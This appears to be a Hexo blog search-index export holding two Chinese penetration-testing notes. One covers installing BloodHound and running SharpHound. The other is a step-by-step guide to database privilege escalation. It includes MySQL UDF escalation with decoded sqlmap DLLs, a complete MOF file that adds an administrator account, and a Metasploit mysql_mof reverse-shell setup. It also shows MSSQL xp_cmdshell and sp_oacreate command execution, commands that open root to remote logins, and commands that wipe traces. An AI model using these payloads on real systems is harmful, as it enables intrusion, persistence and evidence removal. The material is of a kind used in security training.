<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BloodHound</title>
    <url>/2023/03/02/BloodHound/</url>
    <content><![CDATA[<h1 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h1><p><font color='red'>使用可视化的图形来展示活动目录之间的关系</font></p>
<p>通过图形，将域用户、计算机、组、对话、ACL之间的关系展现出来</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先需要安装<font color='red'>java环境</font></p>
<p>其次需要安装<font color='cornflowerblue'>Neo4j数据库</font></p>
<p>最后运行bloodhound</p>
<p>安装Neo4j数据库</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install neo4j<br></code></pre></td></tr></table></figure>



<p>启动数据库</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">neo4j <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure>



<p>然后浏览器访问，默认账号密码是neo4j，登陆之后要求重置密码</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">7474</span><br></code></pre></td></tr></table></figure>



<p>下载bloodhound</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BloodHoundAD/</span>BloodHound/releases<br></code></pre></td></tr></table></figure>



<p>解压之后执行</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./BloodHound</span> <span class="hljs-params">--no-sandbox</span><br></code></pre></td></tr></table></figure>



<p>然后会弹出弹窗，输入之前数据库的账号密码即可</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230228103735813.png"  ><span class="image-caption">image-20230228103735813</span></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>bloodhound</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230228114729306.png"  ><span class="image-caption">image-20230228114729306</span></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>两种方法</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">一种是powershell脚本<span class="hljs-keyword">sharphound.ps1</span><br><span class="hljs-keyword"></span><br>powershell -exec <span class="hljs-keyword">bypass </span>-command <span class="hljs-string">&quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</span><br><br>一种是<span class="hljs-keyword">sharphound.exe</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">SharpHound.exe </span>-c all<br></code></pre></td></tr></table></figure>



<p>运行之后会生成ZIP压缩包</p>
<p><font color='cornflowerblue'>把压缩包导入bloodhound即可</font></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库提权</title>
    <url>/2023/03/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="常见数据库端口号"><a href="#常见数据库端口号" class="headerlink" title="常见数据库端口号"></a>常见数据库端口号</h2><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MySQL</span>						        <span class="hljs-number">3306</span><br><br><span class="hljs-attribute">SQL</span> Server						<span class="hljs-number">1433</span><br><br><span class="hljs-attribute">Oracle</span>							     <span class="hljs-number">1521</span><br><br><span class="hljs-attribute">pointbase</span>						 <span class="hljs-number">9092</span><br><br><span class="hljs-attribute">DB2</span>									<span class="hljs-number">50000</span><br><br><span class="hljs-attribute">sybase</span>								<span class="hljs-number">5000</span><br><br><span class="hljs-attribute">postgreSQL</span>						<span class="hljs-number">5432</span><br><br><span class="hljs-attribute">mongoDB</span>							<span class="hljs-number">27017</span><br><br><span class="hljs-attribute">redis</span>									<span class="hljs-number">6379</span><br><br><span class="hljs-attribute">memcached</span>						<span class="hljs-number">11211</span><br></code></pre></td></tr></table></figure>



<h2 id="数据库提权的目的"><a href="#数据库提权的目的" class="headerlink" title="数据库提权的目的"></a>数据库提权的目的</h2><p>数据库提权，并不是拿到数据库的root权限，并不是提升数据库用户的权限</p>
<p>而是拿到系统的权限，即system权限</p>
<h2 id="拿到root权限方法"><a href="#拿到root权限方法" class="headerlink" title="拿到root权限方法"></a>拿到root权限方法</h2><h3 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h3><p>最主要的方法</p>
<p>通过查看数据库的配置文件，得到root账号的密码</p>
<p>一般配置文件所在文件夹</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sql</span> <span class="hljs-meta">data</span> inc config conn database <span class="hljs-meta">common</span> <span class="hljs-meta">include</span>等<br></code></pre></td></tr></table></figure>



<p>其次就是查看数据库的存储文件或备份文件</p>
<p>存储文件的后缀一般是    <font color='red'>myd</font></p>
<p>查询存储文件位置</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span>  @@basedir <span class="hljs-keyword">as</span> basePath <span class="hljs-keyword">from</span>  dual <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230109155241975.png"  ><span class="image-caption">image-20230109155241975</span></p>
<h3 id="本地脚本爆破"><a href="#本地脚本爆破" class="headerlink" title="本地脚本爆破"></a>本地脚本爆破</h3><p>本地爆破脚本网上比较多，一大堆，能不能破解就听天由命咯</p>
<h3 id="远程爆破"><a href="#远程爆破" class="headerlink" title="远程爆破"></a>远程爆破</h3><p>这个实现其实不太现实</p>
<p>它需要开放远程连接，但是敏感的root用户基本上是不会开放远程连接的，只能试试</p>
<h1 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h1><h2 id="UDF（user-defined-function）提权"><a href="#UDF（user-defined-function）提权" class="headerlink" title="UDF（user defined function）提权"></a>UDF（user defined function）提权</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>UDF是user defined function的简写，顾名思义是用    用户自定义函数进行提权</p>
<p>用户自定义函数是mysql数据库的一个拓展接口，它支持用户自定义函数的功能</p>
<p>但是自定义的函数，需要以    动态链接    的形式来写出mysql插件，来给mysql使用</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">linux的动态链接文件以<span class="hljs-string">.so</span>结尾<br>windows的动态文件以<span class="hljs-string">.dll</span>结尾<br></code></pre></td></tr></table></figure>



<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理主要是建立在MySQL的func上，官方的定义是：对认证的用户——只要拥有INSERT和DELETE这两个权限的用户，就可以在任意的数据库下面以MySQL创建一个函数，然后用这个函数去攻击数据库来达到我们的目的</p>
<p>mysql通常是使用管理员权限进行配置，我们通过mysql添加函数，执行的命令，自然是高权限</p>
<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ol>
<li><p><font color='orange'>拿到数据库的root权限，且mysql要有system权限</font></p>
</li>
<li><p><font color='orange'>知道数据库的账号密码</font></p>
</li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">拿到webshell权限之后，读取网站数据库的<br>配置文件<br>存储文件<br>备份文件<br>来获取数据库用户的账号密码<br></code></pre></td></tr></table></figure>



<ol start="3">
<li><font color='orange'>可以远程登陆数据库</font></li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">默认情况下，数据库是不允许远程登陆的，只允许本地登陆<br><br>这种情况，就只能通过拿到本机的高权限rdp远程登录桌面，才能连接<br></code></pre></td></tr></table></figure>



<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">mysql数据库的远程连接设置在	/etc/mysql/my.conf<br>对应设置为	bind-address = <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>只需要把值改为	<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><br>然后给远程登陆的用户赋予权限<br>新建一个用户<br>用	%	来允许任意ip登陆<br>操作如下<br><br>新建一个名为<span class="hljs-keyword">admin</span>的账户<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-keyword">admin</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">option</span>;<br>刷新配置<br>flush <span class="hljs-keyword">privileges</span>;<br><br>设置root账户可以外连<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">option</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure>



<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">还可以这样设置远程连接<br>首先登陆数据库<br><br>然后查看<span class="hljs-keyword">user</span>表中的记录<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span><br><br>最后设置任意地址可以连接root<br><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host=<span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure>



<ol start="4">
<li><font color='orange'>mysql有写入文件的权限</font></li>
</ol>
<p>通过查看<font color='red'><strong>secure_file_priv</strong></font>的值，来确定是否有写入权限</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> @<span class="hljs-symbol">@secure_file_priv</span><br></code></pre></td></tr></table></figure>

<p>值为<font color='cornflowerblue'><strong>NULL</strong></font>，表示不允许导入导出，无法提权</p>
<p>值为<font color='cornflowerblue'><strong>/tmp/</strong></font>，表示只能在tmp目录下导入导出，无法提权</p>
<p>值为空，表示无限制，<font color='red'><strong>可以提权</strong></font></p>
<p>在**<font color='red'>my.ini</font><strong>文件里面修改，</strong><font color='red'>重启mysql数据库才能生效</font>**</p>
<p>在mysql5.5版本以前secure_file_priv的值默认为空，5.5版本以后默认为NULL</p>
<h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><ol>
<li><font color='orange'>查看数据库版本</font></li>
</ol>
<p>Windows的UDF提权是需要分mysql数据库版本的</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">version</span>()</span>;           <span class="hljs-meta">#查看数据库版本</span><br></code></pre></td></tr></table></figure>



<ol start="2">
<li><font color='orange'>判断存放位置</font></li>
</ol>
<p>当版本小于5.1</p>
<p>需要把udf.dll放在    <font color='red'>C:\windows\system32</font></p>
<p>当版本大于5.1</p>
<p>需要把udf.dll放在    <font color='red'>mysql\lib\plugin</font>，如果没有这个文件夹，就自己创建一个</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> @@basedir           <span class="hljs-meta">#查看mysql数据库安装位置</span><br><br>show variables <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;%plugin%&quot;</span>                 <span class="hljs-meta">#查看plugin位置</span><br><br>show variables <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;%compile%&quot;</span>             <span class="hljs-meta">#查看数据库是32位还是64位</span><br></code></pre></td></tr></table></figure>

<p>然后根据版本上传udf.dll文件</p>
<ol start="3">
<li><font color='orange'>查找dll文件</font></li>
</ol>
<p>udf.dll文件是现成有的</p>
<p>在sqlmap和msf里面都有，根据<font color='red'>数据库版本</font>使用对应的dll文件即可</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">sqlmap<br><br>sqlmap<span class="hljs-string">\data\udf\mysql</span>              <span class="hljs-comment">#dll文件路径</span><br><br>sqlmap里面的dll文件，为了防止被误杀，编码过，需要解码<br>sqlmap自带了解码脚本，在sqlmap<span class="hljs-string">\extra\cloak</span><br>python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll   <span class="hljs-comment">#解码</span><br></code></pre></td></tr></table></figure>



<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">msf<br><br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>data<span class="hljs-regexp">/exploits/my</span>sql/      <span class="hljs-comment">#dll文件路径</span><br><br>无需解码，直接使用<br></code></pre></td></tr></table></figure>



<ol start="4">
<li><font color='orange'>创建自定义函数</font></li>
</ol>
<p>创建sys_eval函数</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp">create function sys_eval returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&#x27;udf.dll文件名字&#x27;</span>;   <span class="hljs-meta">#创建函数</span><br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> func;           <span class="hljs-meta">#查看函数是否创建成功</span><br></code></pre></td></tr></table></figure>



<p>利用sys_eval函数执行命令</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_eval</span>(<span class="hljs-params"><span class="hljs-string">&#x27;whoami&#x27;</span></span>)</span>;<br></code></pre></td></tr></table></figure>





<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说，最终目的就是</p>
<p>利用udf.dll文件来创建自定义函数</p>
<p>前提是我们可以远程连接数据库，且有一定的权限</p>
<p>还需要注意的是，如果要删除udf文件，首先记得删除函数，再删除文件，不然后续创建可能会起冲突</p>
<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><h3 id="手工提权"><a href="#手工提权" class="headerlink" title="手工提权"></a>手工提权</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>Windows的这个目录下的    nullevt.mof文件</p>
<p>该文件每隔一段时间就会去执行一次</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">c:<span class="hljs-regexp">/windows/</span>system32<span class="hljs-regexp">/wbem/m</span>of/<br></code></pre></td></tr></table></figure>



<h4 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h4><p>只适用于低版本的Windows</p>
<p><strong><font color='cornflowerblue'>xp和server2003</font></strong></p>
<p>对c:/windows/system32/wbem/mof/     <font color='red'><strong>有写权限</strong></font></p>
<h4 id="提权操作-1"><a href="#提权操作-1" class="headerlink" title="提权操作"></a>提权操作</h4><ol>
<li><font color='orange'>找到一个拥有可写权限的目录上传mof文件</font></li>
</ol>
<p>文件内容</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __EventFilter as $EventFilter <br>&#123; <br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>; <br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    Query<span class="hljs-class">Language = &quot;WQL&quot;;</span> <br>&#125;; <br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of ActiveScriptEventConsumer as $Consumer <br>&#123; <br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>; <br>    ScriptText = <br>    <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user admin admin123!@<span class="hljs-comment"># /add\&quot;)&quot;; </span><br>&#125;; <br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __FilterToConsumerBinding <br>&#123; <br>    Consumer   = $Consumer; <br>    Filter = $EventFilter; <br>&#125;;<br><br></code></pre></td></tr></table></figure>





<ol start="2">
<li><font color='orange'>将该mof文件复制到c:/windows/system32/wbem/mof/</font></li>
</ol>
<figure class="highlight lasso"><table><tr><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span>  load_file(<span class="hljs-string">&quot;C:/phpstudy/WWW/add_admin.mof&quot;</span>)  <span class="hljs-keyword">into</span>  dumpfile  <span class="hljs-string">&quot;C:/WINDOWS/system32/wbem/mof/add_admin.mof&quot;</span><br></code></pre></td></tr></table></figure>

<p>然后就等待，过一会系统就会自己执行该文件</p>
<p>然后就添加了admin账户</p>
<p>net user查看，发现管理员组多了admin这个账户</p>
<h4 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h4><ol>
<li>关闭 winmgmt 服务</li>
<li>删除mof文件</li>
</ol>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 停止 winmgmt 服务</span><br>net stop winmgmt<br><span class="hljs-comment"># 删除 Repository 文件夹</span><br>rmdir <span class="hljs-regexp">/s /</span>q C:\Windows\system32\wbem\Repository\<br><span class="hljs-comment"># 手动删除 mof 文件</span><br>del C:\Windows\system32\wbem\mof\good\test.mof <span class="hljs-regexp">/F /</span>S<br><span class="hljs-comment"># 删除创建的用户</span><br>net user hacker /<span class="hljs-keyword">delete</span><br><span class="hljs-comment"># 重新启动服务</span><br>net start winmgmt<br></code></pre></td></tr></table></figure>





<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p><strong><font color='red'>在低版本的Windows 2003中，向mof文件夹里面写入特殊的mof文件，即可提权</font></strong></p>
<p>手动MOF提权的缺点是痕迹清理比较麻烦</p>
<h3 id="利用MSF进行MOF提权"><a href="#利用MSF进行MOF提权" class="headerlink" title="利用MSF进行MOF提权"></a>利用MSF进行MOF提权</h3><h4 id="提权操作-2"><a href="#提权操作-2" class="headerlink" title="提权操作"></a>提权操作</h4><p>这个就更简单了，直接利用msf的模块</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams">use exploit/windows/mysql/mysql_mof<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.10.17</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">username root</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">password root</span><br>run<br></code></pre></td></tr></table></figure>

<p>也是需要知道数据库高权限用户的，用户名和密码</p>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>msf的mysql提权，提权之后，msf会<font color='cornflowerblue'>自动进行痕迹清理</font></p>
<p>方便高效</p>
<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>windows系统开机时会自动启动一些程序</p>
<p>这些程序是system启动的，所以这些程序都是拥有system权限的</p>
<p>主要思路就是向启动项中写入脚本，bat或vbs都可</p>
<p>利用mysql数据库写入，只是其中一种方法</p>
<p>详细在启动项提权里面</p>
<h1 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h1><h2 id="MSSQL数据库安装"><a href="#MSSQL数据库安装" class="headerlink" title="MSSQL数据库安装"></a>MSSQL数据库安装</h2><p><strong><font color='red'>以2008r2数据库为例</font></strong></p>
<p>下载数据库文件，以<font color='red'>管理员身份</font>运行setup</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113121335871.png"  ><span class="image-caption">image-20230113121335871</span></p>
<p>选择安装</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113121519051.png"  ><span class="image-caption">image-20230113121519051</span></p>
<p>然后一直默认直到，功能全选，目录默认</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113122140067.png"  ><span class="image-caption">image-20230113122140067</span></p>
<p>直到，配置选择system权限</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113122419065.png"  ><span class="image-caption">image-20230113122419065</span></p>
<p>选择混合模式，添加密码，添加当前账户</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113122611060.png"  ><span class="image-caption">image-20230113122611060</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113122713250.png"  ><span class="image-caption">image-20230113122713250</span></p>
<p>然后一直默认下一步，就行，然后就安装完成</p>
<h2 id="MSSQL数据库使用"><a href="#MSSQL数据库使用" class="headerlink" title="MSSQL数据库使用"></a>MSSQL数据库使用</h2><p>找到    <font color='cornflowerblue'><strong>SQL Server Management Studio</strong></font></p>
<p><strong><font color='red'>MSSQL数据库的管理员默认为   sa</font></strong></p>
<p>密码即为我们刚才设置的</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113123745137.png"  ><span class="image-caption">image-20230113123745137</span></p>
<p>连接即可使用</p>
<h2 id="xp-cmdshell提权"><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>xp_cmdshell是数据库中可以执行系统命令的组件，可以利用该组件运行系统命令</p>
<p>xp_cmdshell是数据库系统存储过程，高权限的存储过程可以遍历和执行命令，xp_cmdshell就是可以任意执行系统命令的存储过程</p>
<h3 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h3><p>xp_cmdshell在<font color='red'><strong>MSSQL2005之后是关闭的</strong></font></p>
<p>但是</p>
<p>只要拥有数据库高权限，是可以手动开启的</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>            <br>RECONFIGURE<span class="hljs-comment">;</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>



<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>首先用高权限用户连接数据库，<font color='red'><strong>默认是可以远程连接的</strong></font></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113130828175.png"  ><span class="image-caption">image-20230113130828175</span></p>
<p>连接成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113130951367.png"  ><span class="image-caption">image-20230113130951367</span></p>
<p>首先是<font color='cornflowerblue'>查看是否存在</font>xp_cmdshell，因为它是有可能被删除</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*)<span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype = <span class="hljs-string">&#x27;x&#x27;</span> and name = <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>;    <span class="hljs-meta">#返回1则存在</span><br></code></pre></td></tr></table></figure>



<p>删除之后，也是可以恢复的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> master.sys.sp_addextendedproc <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-string">&#x27;C:\Program Files\Microsoft SQL</span><br><span class="hljs-string">Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></code></pre></td></tr></table></figure>



<p>然后就是<font color='orange'>启用</font>xp_cmdshell</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">EXEC</span> sp_configure &#x27;<span class="hljs-keyword">show</span> advanced options&#x27;, <span class="hljs-number">1</span>;    <span class="hljs-meta">#允许修改高级参数</span><br>RECONFIGURE;<br><span class="hljs-built_in">EXEC</span> sp_configure &#x27;xp_cmdshell&#x27;, <span class="hljs-number">1</span>;            <span class="hljs-meta">#开启xp_cmdshell</span><br>RECONFIGURE;<br></code></pre></td></tr></table></figure>



<p>未开启</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113131903948.png"  ><span class="image-caption">image-20230113131903948</span></p>
<p>开启</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113132031880.png"  ><span class="image-caption">image-20230113132031880</span></p>
<p>关闭xp_cmdshell命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, 1;<br>reconfigure;<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, 0;<br>reconfigure;<br></code></pre></td></tr></table></figure>



<p>开启之后，就可以用xp_cmdshell执行命令，此时是以system权限执行命令的</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">EXEC master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_cmdshell</span> <span class="hljs-string">&#x27;命令&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113132125346.png"  ><span class="image-caption">image-20230113132125346</span></p>
<p>提权成功</p>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>总的来说，这种提权方式，就是用xp_cmdshell来执行命令</p>
<p>所有的操作都是围绕开启xp_cmdshell这个组件来展开的</p>
<h2 id="sp-oacreate提权"><a href="#sp-oacreate提权" class="headerlink" title="sp_oacreate提权"></a>sp_oacreate提权</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>sp_oacreate用来调用<font color='red'>OLE对象</font>，利用OLE对象的run方法执行系统命令</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>数据库本身具有高权限，因为需要调用COM组件</p>
<p>大多用于xp_cmdshell组件被删除，不能使用xp_cmdshell方法</p>
<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>首先还是查看sp_oacreate组件是否启用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>;<br></code></pre></td></tr></table></figure>



<p>打开组件</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><code class="hljs delphi">EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;       <br>RECONFIGURE <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">OVERRIDE</span>;  <br>EXEC sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;  <br>RECONFIGURE <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">OVERRIDE</span>;  <br></code></pre></td></tr></table></figure>



<p>因为使用sp_oacreate组件执行命令时，是没有回显的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod<br><span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br><br>#把结果保存到了	c:\\<span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure>

<p>把结果保存到文档里面，就可以读取了</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113152811330.png"  ><span class="image-caption">image-20230113152811330</span></p>
<p>没有任何回显</p>
